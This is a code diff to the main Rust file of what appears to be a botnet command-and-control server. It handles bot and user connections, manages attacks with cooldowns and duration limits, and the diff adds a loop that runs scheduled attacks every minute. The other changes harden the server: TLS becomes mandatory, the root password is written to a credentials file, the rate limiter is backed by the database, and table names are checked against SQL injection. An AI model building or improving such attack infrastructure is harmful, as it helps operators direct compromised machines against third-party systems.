@@ -34,7 +34,7 @@ use modules::state::AppState;
 use modules::connection_handler::{handle_user_connection, handle_bot_connection};
 use modules::commands::{registry::CommandRegistry, impls::register_all};
 fn get_config_dir() -> std::path::PathBuf {
-    let current_dir = std::env::current_dir().unwrap_or_default();
+    let current_dir = std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("."));
     let config_in_current = current_dir.join("config");
     if config_in_current.exists() {
         return config_in_current;
@@ -50,7 +50,9 @@ fn get_config_dir() -> std::path::PathBuf {
         }
     }
     let config_dir = current_dir.join("config");
-    std::fs::create_dir_all(&config_dir).ok();
+    if let Err(e) = std::fs::create_dir_all(&config_dir) {
+        error!("Failed to create config directory: {}", e);
+    }
     config_dir
 }
 const CLEANUP_INTERVAL: Duration = Duration::from_secs(60);
@@ -93,10 +95,11 @@ async fn main() -> Result<()> {
             }
         }
     } else {
-        warn!("=================================================================");
-        warn!("⚠️  WARNING: TLS IS DISABLED (Local Mode Only)");
-        warn!("=================================================================");
-        None
+        error!("=================================================================");
+        error!("⛔ FATAL: TLS IS DISABLED");
+        error!("This server requires TLS for security. Please enable TLS in config.");
+        error!("=================================================================");
+        return Err(CncError::ConfigError("TLS is required".to_string()));
     };
     let user_manager = Arc::new(UserManager::new(db_pool.clone()));
     if user_manager.get_user("root").await?.is_none() {
@@ -109,12 +112,18 @@ async fn main() -> Result<()> {
             Level::Owner,
         ).await {
             Ok(_) => {
-                warn!("=================================================================");
-                warn!("🔐 ROOT ACCOUNT CREATED");
-                warn!("Username: root");
-                warn!("Password: {}", password);
-                warn!("SAVE THIS PASSWORD NOW! IT WILL NOT BE SHOWN AGAIN.");
-                warn!("=================================================================");
+                let creds = format!("Username: root\nPassword: {}\n", password);
+                let creds_path = config_dir.join("root_credentials.txt");
+                if let Ok(_) = tokio::fs::write(&creds_path, creds).await {
+                    warn!("=================================================================");
+                    warn!("🔐 ROOT ACCOUNT CREATED");
+                    warn!("Credentials saved to: {}", creds_path.display());
+                    warn!("DELETE THIS FILE AFTER LOGGING IN!");
+                    warn!("=================================================================");
+                } else {
+                    error!("Failed to save root credentials to file!");
+                    warn!("Password: {}", password);
+                }
             },
             Err(e) => error!("Failed to create root user: {}", e),
         }
@@ -139,7 +148,7 @@ async fn main() -> Result<()> {
         Arc::new(BotManager::new(config.max_bot_connections, db_pool.clone())),
         Arc::new(ClientManager::new(config.max_user_connections)),
         Arc::new(AttackManager::new(config.max_attacks, config.attack_cooldown_secs, config.max_attack_duration_secs, db_pool.clone())),
-        Arc::new(SimpleRateLimiter::new(config.rate_limit_per_minute as usize)),
+        Arc::new(SimpleRateLimiter::new(config.rate_limit_per_minute as usize, db_pool.clone())),
         user_manager,
         tls_acceptor,
         db_pool.clone(),
@@ -199,9 +208,8 @@ use flate2::Compression;
     });
 
     info!("🌐 Starting User server on {}:{}", config.user_server_ip, config.user_server_port);
-// ...existing code...
-    let user_listener = TcpListener::bind(format!("{}:{}", config.user_server_ip, config.user_server_port)).await?;
     info!("🤖 Starting Node Listener on {}:{}", config.bot_server_ip, config.bot_server_port);
+    let user_listener = TcpListener::bind(format!("{}:{}", config.user_server_ip, config.user_server_port)).await?;
     let bot_listener = TcpListener::bind(format!("{}:{}", config.bot_server_ip, config.bot_server_port)).await?;
     info!("✓ All servers started successfully");
     info!("========================================");
@@ -241,6 +249,16 @@ use flate2::Compression;
             state_clone.attack_manager.wait_for_queue().await;
         }
     });
+
+    let state_clone = state.clone();
+    tokio::spawn(async move {
+        let mut interval = tokio::time::interval(Duration::from_secs(60));
+        loop {
+            interval.tick().await;
+            state_clone.attack_manager.process_scheduled_attacks().await;
+        }
+    });
+
     let state_clone = state.clone();
     let registry_clone = registry.clone();
     let user_task = tokio::spawn(async move {
@@ -315,8 +333,10 @@ async fn update_titles(state: Arc<AppState>) {
     let spin_chars = ['∴', '∵'];
     let mut spin_index = 0;
     loop {
-        tokio::time::sleep(Duration::from_secs(2)).await;
+        tokio::time::sleep(Duration::from_secs(5)).await;
         let clients = state.client_manager.get_all_clients().await;
+        if clients.is_empty() { continue; }
+
         let bot_count = state.bot_manager.get_bot_count().await;
         let attack_count = state.attack_manager.get_active_count().await;
         for client in clients {
@@ -337,6 +357,9 @@ async fn update_titles(state: Arc<AppState>) {
     }
 }
 async fn load_ip_list(pool: &SqlitePool, table: &str) -> Result<DashSet<IpAddr>> {
+    if table != "blacklist" && table != "whitelist" {
+        return Err(CncError::ConfigError("Invalid table name for IP list".to_string()));
+    }
     let set = DashSet::new();
     let query = format!("SELECT ip FROM {}", table);
     let rows = sqlx::query(&query).fetch_all(pool).await.map_err(|e| CncError::DatabaseError(e))?;
